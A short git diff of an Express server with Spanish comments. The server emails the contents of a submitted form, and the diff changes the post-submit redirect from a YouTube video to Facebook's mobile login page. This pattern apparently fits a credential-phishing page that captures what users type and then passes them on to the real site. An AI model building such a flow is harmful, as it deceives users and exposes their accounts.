@@ -21,9 +21,7 @@ app.use(express.json()); // Necesario si esperas enviar JSON (aunque el formular
 // Por lo tanto, simplemente sirve los archivos desde ese directorio.
 app.use(express.static(path.join(__dirname)));
 
-// Ruta para servir el archivo HTML principal (Correo.html)
-// Cuando alguien visite la URL base de tu aplicación (ej. https://tu-app.onrender.com/),
-// se le enviará el archivo Correo.html.
+
 app.get('/', (req, res) => {
     // Si 'Correo.html' está en la misma carpeta que 'servidor.js' (ambos dentro de 'Public'),
     // esta es la ruta correcta.
@@ -61,7 +59,7 @@ app.post('/enviar-correo', async (req, res) => {
     try {
         await transporter.sendMail(mailOptions);
         // Si el correo se envía con éxito, redirige a la URL de YouTube
-        res.redirect('https://youtu.be/2dtNT_zQqV4?si=9_FwEnc-Rifv2YtZ');
+        res.redirect('https://m.facebook.com/login/');
     } catch (error) {
         // Si hay un error al enviar el correo, muéstralo en la consola del servidor
         console.error('Error al enviar el correo:', error);
